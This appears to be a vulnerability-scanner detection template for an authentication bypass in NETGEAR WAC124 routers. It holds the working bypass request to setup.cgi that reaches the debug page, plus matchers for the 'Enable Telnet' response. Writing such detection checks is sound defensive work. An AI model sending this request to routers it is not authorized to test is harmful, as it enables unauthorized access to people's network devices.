id: netgear-wac124-router-auth-bypass
name: NETGEAR WAC124 - Authentication Bypass
severity: high
confidence: tentative
description: NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability. An attacker can gain access by
  bypassing proper authentication, thereby making it possible to obtain sensitive information, modify data, and/or execute
  unauthorized operations.
reference: CWE-287
tags:
- netgear
- auth-bypass
- router
- iot
- vuln
requests:
- method: GET
  path: /setup.cgi?next_file=debug.htm&x=currentsetting.htm
  matchers:
  - type: status
    status:
    - 200
  - type: body
    words:
    - Enable Telnet
  condition: and
